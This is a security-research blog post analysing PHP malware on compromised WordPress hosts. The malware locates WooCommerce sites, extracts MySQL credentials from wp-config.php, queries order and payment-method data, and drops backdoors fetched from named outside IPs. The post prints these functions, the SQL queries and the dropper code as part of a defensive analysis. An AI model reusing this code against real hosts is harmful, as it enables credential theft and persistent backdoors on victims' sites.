@@ -1,0 +1,116 @@
+WordPress Malware Collects Sensitive WooCommerce Data
+
+During a recent investigation, our team found malicious code that reveals how attackers are performing reconnaissance to identify if sites are actively using WooCommerce in a compromised hosting environment. These compromised websites are victims of the ongoing wave of exploits against vulnerable WordPress plugins.
+Why are WooCommerce websites being targeted?
+WooCommerce is a powerful WordPress plugin that can help a website owner set up an ecommerce store. WooCommerce’s popularity has allowed it to quickly grow a large market share and become one of the biggest ecommerce platforms in the world.
+This popularity does not go unnoticed by attackers, and it’s the reason why we believe this platform has been targeted. Our team has observed increased occurrences of skimmers and other payment data capturing malware found on websites using WooCommerce.
+Attackers benefit from existing vulnerabilities found within a large number of WordPress plugins. These vulnerabilities allow attackers to gain unauthorized access to the website and subsequently the WooCommerce-related data that exists within the website’s WordPress database. It’s important to note that by default, the WooCommerce plugin does not store payment card data — attackers can’t simply steal sensitive payment details from the WordPress database.
+How is reconnaissance performed?
+The reconnaissance is performed by a malicious file injected (post-exploit stage) into a website’s hosting environment, and allows a bad actor to “map” out what is available to the user/owner of the file.
+For example, an uploaded file owned by the cPanel user can usually read/write recursively to the files inside of its own /home/user/ directory. This occurs due to the assigned ownership and permissions and is often what leads to cross-site contamination and can be a major problem for hosting clients that host many websites from a single user.
+The malicious file (5ea331c1744115ea331c17441f.php) is written in PHP and creates various functions that are used to search for other WordPress websites, connect to their database, and query the database for specific WooCommerce data.
+Searching hosting environments for WooCommerce
+getDir is a function defined in this malware which recursively searches the surrounding directories. If it detects wp-config.php in any directory, it then performs a check for the default /wp-content/plugins/woocommerce/ directory. If this second woocommerce directory exists, one can expect to find WooCommerce related information stored in the $woo[] variable array (orders for number of total orders and path for the full directory path):
+function getDir($path){
+global $woo;
+$d = dir($path);
+$dir = array();
+if($d) {
+while (false !== ($entry = $d->read())) {
+if ($entry == 'wp-config.php') {
+if (is_dir($path . '/wp-content/plugins/woocommerce')) {
+$orders = checkOrders($path.'/'.$entry);
+$woo[] = array('orders' => $orders, 'path' => $path . '/' . $entry); }
+}
+if (is_dir($path . '/' . $entry) && ($entry != '.') && ($entry != '..')) {
+$dir[] = array('name' => $entry, 'path' => $path . '/' . $entry); }
+}
+$d->close();}
+return $dir;}
+
+Extracting database credentials
+get_wordpress_data is another unique function which is used to extract the MySQL database login data from any available wp-config.php files discovered in the hosting environment.
+The malware accomplishes this through the PHP function preg_match_all, a foreach loop, and an array of strings containing the MySQL login data (db_name, db_user, db_password, db_host, and table_prefix).
+function get_wordpress_data($path) {
+$content = file_get_contents( $path );
+if( ! $content ) {
+return false;
+}
+$params = [
+'db_name' => "/define.+?'DB_NAME'.+?'(.*?)'.+/",
+'db_user' => "/define.+?'DB_USER'.+?'(.*?)'.+/",
+'db_password' => "/define.+?'DB_PASSWORD'.+?'(.*?)'.+/",
+'db_host' => "/define.+?'DB_HOST'.+?'(.*?)'.+/",
+'table_prefix' => "/table_prefix.+?\=.+?'(.*?)'.+/",
+];
+...
+
+Retrieving WooCommerce data
+checkOrders is a third function which uses the extracted MySQL database credentials to access the WordPress database. It then queries it, storing any retrieved data into the $woo variable array.
+function checkOrders($path){
+$config = get_wordpress_data($path);
+$conn = mysqli_connect($config['db_host'], $config['db_user'], $config['db_password'], $config['db_name']);
+...
+
+Malicious SQL queries
+There are a total of three SQL queries submitted to the connected WordPress database.
+The first SQL query is used to return the number of orders by checking for the total rows in the posts table that have their post_type column set to shop_order.
+$result = mysqli_query($conn, "Select count(*) from ".$config['table_prefix']."posts where post_type = 'shop_order'");
+
+The second query goes a little further. It queries the entire row data (i.e select * from) for any orders in the posts table that are greater than the date 2020-03-01, and orders results by the row’s ID:
+$result = mysqli_query($conn, "Select * from ".$config['table_prefix']."posts where post_type = 'shop_order' and DATE(post_date)>'2020-03-01' ORDER BY ID ASC");
+
+The third query searches the postmeta table for rows of data that have the meta_key set to _payment_method and the post_id greater than the $firstID variable, which stores the first post_id returned from the previous SQL query.
+This results in the query searching the postmeta table for metadata belonging to orders made on or after 2020-03-01, essentially confirming that the ecommerce store is active and has seen recent transactions.
+$result = mysqli_query($conn, "Select * from ".$config['table_prefix']."postmeta where post_id > $firstID and meta_key='_payment_method'");
+
+Redundant backdoor dropper
+Another important feature of this malware is that it uses a function similar to getDir to drop three backdoors into each directory discovered within the compromised environment.
+It accomplishes this feat by requesting the $payload (PHP code) from a third party URL (185.117.75[.]251 and 194.36.190[.]88 but they appear to rotate them) using curl, then using file_put_contents to inject $payload into a file with a name generated from uniqid(). The text 1.php and 11.php is appended to the second and third dropped backdoors, respectively.
+$result['links'][$item['name']] = array('name'=>$item['name'],'path'=>$item['path'], 'url'=>'http://'.$item['name'].'/'.$filename.'.php', 'url1'=>'http://'.$item['name'].'/'.$filename.'1.php');
+file_put_contents($item['path'].'/'.$filename.'.php','<?php  /*'.md5(time()).md5(time()).'*/ ?>'.$payload);
+file_put_contents($item['path'].'/'.$filename.'1.php','<?php  /*'.md5(time()).md5(time()).'*/ ?>'.$payload1);
+file_put_contents($item['path'].'/'.$filename.'11.php','<?php  /*'.md5(time()).md5(time()).'*/ ?>'.$payload2);
+dirUpload($item['path'],$filename,$payload);
+dirUpload($item['path'],$filename.'1',$payload1);
+dirUpload($item['path'],$filename.'11',$payload2);
+}}
+
+All of the queried data and performed actions are ultimately stored in a $result variable array which gets json_encode’d and printed with echo.
+$result['shops'] = $woo;
+echo "%%%&&&".json_encode($result)."&&&%%%";
+
+The finished output from this malware provides the attacker with the directory and website’s name (name), the full directory path (path), and the URLs to the first dropped backdoor for the corresponding name and path (url and url1).
+Additionally, if WooCommerce is detected,it also passes along sensitive details about any WooCommerce installations, including total orders and payments.
+Code defects lead to false positives
+A formatted sample is shown below which clearly demonstrates that the malware is not perfect; it erroneously detected owl.carousel as a website when it was just a subdirectory. This is because the malware’s PHP code simply looks for the directory’s name to match an existing TLD. As a result, owl.carousel is a match for the .ca TLD and gets inaccurately identified a directory hosting a domain/website.
+%%%&&&{"links":{
+
+"test.localhost":{
+"name":"test.localhost",
+"path":"\/var\/www\/html\/test.localhost\/test.localhost",
+"url":"http:\/\/test.localhost\/5eba1a04b47c4.php",
+"url1":"http:\/\/test.localhost\/5eba1a04b47c41.php"},
+
+"lukeleal.com":{
+"name":"lukeleal.com",
+"path":"\/var\/www\/html\/lukeleal.com",
+"url":"http:\/\/lukeleal.com\/5eba1a04b47c4.php",
+"url1":"http:\/\/lukeleal.com\/5eba1a04b47c41.php"},
+
+"owl.carousel":{
+"name":"owl.carousel",
+"path":"\/var\/www\/html\/public_html\/webpanel\/plugins\/bower_components\/owl.carousel",
+"url":"http:\/\/owl.carousel\/5eba1a04b47c4.php",
+"url1":"http:\/\/owl.carousel\/5eba1a04b47c41.php"},
+
+"shops":[{"orders":{
+"count":[{"count(*)":"1"}],
+"month":1,
+"firsID":"4314",
+"payments":[]},
+"path":"\/var\/www\/html\/wordpress\/wp-config.php"}]}&&&%%%
+
+Conclusion
+This malware is a great example of attackers leveraging unauthorized access to determine new, potential targets within compromised hosting environments. It also demonstrates how cross-site contamination can occur creating multiple backdoors in directories outside of the current infected website directory.
+Since this malware doesn’t load on the front of site,it is best detected with a server-side scanner that can monitor the filesystem for changes and doesn’t merely rely on loading a website to detect indicators of compromise.
